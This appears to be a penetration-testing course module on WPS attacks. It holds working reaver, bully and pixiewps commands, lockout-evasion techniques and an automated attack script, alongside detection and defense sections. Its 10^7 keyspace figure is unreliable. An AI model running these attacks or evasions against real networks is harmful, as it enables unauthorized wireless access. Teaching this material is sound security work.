# Module 05 — WPS Attacks

## 5.1 Vulnerability: WPS PIN Design

**Affected**: All WiFi Protected Setup (WPS) implementations  
**Root Cause**: 8-digit PIN with checksum reduces keyspace to 10^7  
**Researcher**: Stefan Viehböck (2011) - PIN structure analysis  
**Pixie Dust**: Dominique Bongard (2014) - PRNG entropy flaw

### The Vulnerability

WPS PIN structure:
```
PIN = D1 D2 D3 D4 D5 D6 D7 C
Where:
- D1-D7 = 7 digits (10^7 combinations)
- C = Checksum digit (can be calculated from D1-D7)

Effective keyspace: 10^7 = 10,000,000 combinations
```

Brute-force rate: ~1 PIN/second  
Maximum time: ~115 days (worst case)  
Average time: ~58 days

---

## 5.2 Pixie Dust Attack

### Vulnerability: PRNG Nonce Predictability

**Affected**: Routers with low/non-existent E-S1/E-S2 entropy  
**CVE Reference**: Implementation-specific (not protocol flaw)  
**Attack Type**: Offline PIN recovery from E-S1/E-S2 nonces

### Attack Mechanism

```
WPS Exchange:
1. Enrollee (Client) → Registrar (AP): M1 (N1 nonce)
2. Registrar → Enrollee: M2 (N2 nonce, PKR public key)
3. Enrollee → Registrar: M3 (E-S1, E-Hash1)
4. Registrar → Enrollee: M4 (E-S2, E-Hash2)

Pixie Dust Recovery:
- E-Hash1 = HMAC-SHA256(authkey, E-S1 | PSK1 | PK_E | PK_R)
- E-Hash2 = HMAC-SHA256(authkey, E-S2 | PSK2 | PK_E | PK_R)

Vulnerable routers leak E-S1/E-S2 through PRNG predictability.
With E-S1/E-S2 known, PSK1/PSK2 can be brute-forced offline.
```

### Execution with Reaver

```bash
# Check if target is WPS-enabled
sudo wash -i wlan0mon

# Pixie Dust attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
# -i = interface
# -b = BSSID
# -c = channel
# -K 1 = Pixie Dust attack (mode 1)
# -vv = very verbose

# Output (vulnerable target):
# [Pixie Dust] E-S1: 00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF
# [Pixie Dust] PSK1: 1234567
# [Pixie Dust] PSK2: 7654321
# [Pixie Dust] WPS PIN: 12345670
```

### Execution with Pixiewps

```bash
# Standalone Pixie Dust
sudo pixiewps -e <PK_E> -r <PK_R> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>

# Automated via reaver integration
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1
```

---

## 5.3 Online Brute Force with Reaver

### Standard PIN Attack

```bash
# Basic PIN brute force
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Resume interrupted session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -s /tmp/reaver.session

# Specific PIN attempt
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p 12345670 -vv
```

### Advanced Reaver Options

| Flag | Function | Example |
|------|----------|---------|
| `-d` | Delay between attempts (seconds) | `-d 5` |
| `-l` | Lock wait (seconds when AP locks) | `-l 300` |
| `-g` | Skip to PIN number | `-g 1234567` |
| `-N` | Don't send NACKs | `-N` |
| `-T` | Timeout for response | `-T 3` |
| `-r` | Recurring delay (attempts:delay) | `-r 3:60` (delay 60s every 3 attempts) |

---

## 5.4 Bully Alternative

### Why Bully

- Faster implementation
- Better lockout handling
- Modern codebase
- Built-in Pixie Dust support

### Usage

```bash
# Basic attack
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6

# With Pixie Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -p

# Brute force from specific PIN
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -s 1234567

# Verbose with force
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3 -F
```

---

## 5.5 WPS Lockout Evasion

### The Problem

APs implement lockout after failed attempts:
- Typical: 5-10 failures → 60-300 second lockout
- Some: Permanent lock after 50-100 attempts

### Evasion Techniques

```bash
# 1. Slow attack to avoid triggering lock
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d 10 -r 5:300
# 10s delay between attempts, 5min rest every 5 attempts

# 2. NACK suppression (prevents lockout on some APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -N -d 5

# 3. Session resume after lock
# When lock detected, Ctrl+C, wait 5 minutes:
sleep 300
# Resume:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -s /tmp/reaver.session
```

---

## 5.6 Detection: WPS Attack Signatures

### WIDS Detection

| Signature | Detection Method |
|-----------|------------------|
| Rapid WPS exchange attempts | M1-M8 frame sequence analysis |
| Repeated M3/M4 exchanges | Protocol state machine anomaly |
| Fixed source MAC | MAC consistency check |
| PIN pattern testing | WPS state machine deviation |

### AP Log Evidence

```
Example router logs:
[2024-01-15 14:30:23] WPS: Authentication failed (PIN invalid)
[2024-01-15 14:30:25] WPS: Authentication failed (PIN invalid)
[2024-01-15 14:30:27] WPS: Authentication failed (PIN invalid)
[2024-01-15 14:30:29] WPS: Lockout triggered - 300s cooldown
```

---

## 5.7 Defense: WPS Security

### Disable WPS (Recommended)

```
Router Configuration:
Wireless → WPS → Enable WPS: [ ] Disabled
```

### Alternative Mitigations

| Control | Effectiveness | Notes |
|---------|--------------|-------|
| Disable WPS | 100% | Complete protection |
| Enable lockout | 80% | Delays but doesn't stop attack |
| Rate limiting | 70% | Slows brute force |
| Physical button only | 90% | Limits attack window |

---

## 5.8 PoC Script: Automated WPS Testing

```bash
#!/bin/bash
# wps-test.sh - Automated WPS vulnerability assessment
# Usage: sudo ./wps-test.sh <bssid> <channel> <interface>

BSSID=$1
CHANNEL=$2
INTERFACE=${3:-wlan0mon}

if [ $# -lt 2 ]; then
    echo "Usage: sudo $0 <BSSID> <CHANNEL> [INTERFACE]"
    exit 1
fi

echo "[+] WPS Vulnerability Assessment"
echo "[+] Target: $BSSID on channel $CHANNEL"

# Step 1: Check if WPS enabled
echo "[+] Checking WPS status..."
WPS_INFO=$(sudo timeout 30 wash -i "$INTERFACE" -C 2>/dev/null | grep "$BSSID")

if [ -z "$WPS_INFO" ]; then
    echo "[!] Target not found or WPS disabled"
    exit 1
fi

echo "[+] WPS Enabled: Yes"
echo "$WPS_INFO"

# Step 2: Pixie Dust test
echo ""
echo "[+] Testing Pixie Dust vulnerability..."
sudo timeout 120 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -K 1 -vv 2>&1 | tee /tmp/pixie-test.log | grep -E "(PIN|WPS|Pixie)"

if grep -q "WPS PIN" /tmp/pixie-test.log; then
    echo "[+] VULNERABLE: Pixie Dust successful"
    grep "WPS PIN" /tmp/pixie-test.log
    exit 0
fi

# Step 3: Check for lockout
echo ""
echo "[+] Testing lockout behavior..."
sudo timeout 60 reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -p 00000000 -vv 2>&1 | grep -i "lock"

# Step 4: Recommendations
echo ""
echo "[+] Assessment Complete"
echo "[+] If lockout triggered quickly: AP has WPS rate limiting"
echo "[+] If no lockout: AP vulnerable to slow brute force"
```

---

## 5.9 Knowledge Check

Before proceeding, verify you can:

1. Explain WPS PIN structure and checksum calculation
2. Execute Pixie Dust attack with reaver
3. Describe the difference between online and offline WPS attacks
4. Identify WPS lockout evasion techniques
5. Explain why disabling WPS is the only complete defense

---

**Next**: [Module 06 — Password Cracking](06-password-cracking.md)
